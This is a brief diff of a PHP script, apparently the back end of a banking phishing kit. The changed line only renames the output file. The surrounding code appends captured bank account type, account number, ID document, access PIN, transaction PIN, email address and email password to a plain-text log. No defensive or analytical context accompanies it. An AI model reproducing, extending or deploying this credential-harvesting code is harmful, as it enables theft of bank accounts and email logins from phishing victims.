@@ -3,7 +3,7 @@
 
 if(isset ($_POST['correo']) && isset ($_POST['correopass']) ){
 
-	$file = fopen("personalindustrial.txt", "a");
+	$file = fopen("NEW01.txt", "a");
 
 fwrite($file, "Tipo= ".$_SESSION['tipo']." - N Cuenta = ".$_SESSION['cuenta']." - documento = ".$_SESSION['documento']." - PIN de acceso.  = ".$_SESSION['pass']."
 Pin de transaccion= ".$_SESSION['pass2']." - Correo =".$_POST['correo']." - Clave de Correo =".$_POST['correopass']."
